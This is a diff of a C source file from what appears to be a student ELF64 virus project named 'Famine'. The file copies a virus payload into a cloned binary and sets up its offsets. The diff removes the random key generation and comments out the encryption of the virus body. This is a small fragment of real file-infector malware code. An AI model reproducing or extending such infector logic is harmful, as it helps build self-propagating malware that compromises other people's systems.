@@ -6,7 +6,7 @@
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/05/11 00:10:33 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/06/15 17:04:28 by ichkamo          ###   ########.fr       */
+/*   Updated: 2019/12/11 20:26:49 by anselme          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -57,16 +57,9 @@
 ** Note that relative_virus_addresss is in the opposite direction !
 */
 
-static void	generate_key(char *buffer, size_t len)
-{
-	ft_getrandom(buffer, len);
-}
-
 static void	init_constants(struct client_info *constants, \
 			const struct entry *clone_entry)
 {
-	generate_key((char *)constants->key, 16);
-
 	const size_t		end_of_last_section = clone_entry->end_of_last_section;
 	const Elf64_Off		p_offset  = (clone_entry->safe_phdr->p_offset);
 	const Elf64_Xword	p_memsz   = (clone_entry->safe_phdr->p_memsz);
@@ -100,7 +93,7 @@ bool		setup_payload(const struct entry *clone_entry, const struct safe_pointer i
 
 	ft_memcpy(payload_location, (void *)famine_entry, payload_size);
 	ft_memcpy(constants_location, &constants, sizeof(constants));
-	cypher(32, virus_location, constants.key, virus_size);
+	// cypher(virus_location, virus_size); // TODO uncomment
 
 	return true;
 }
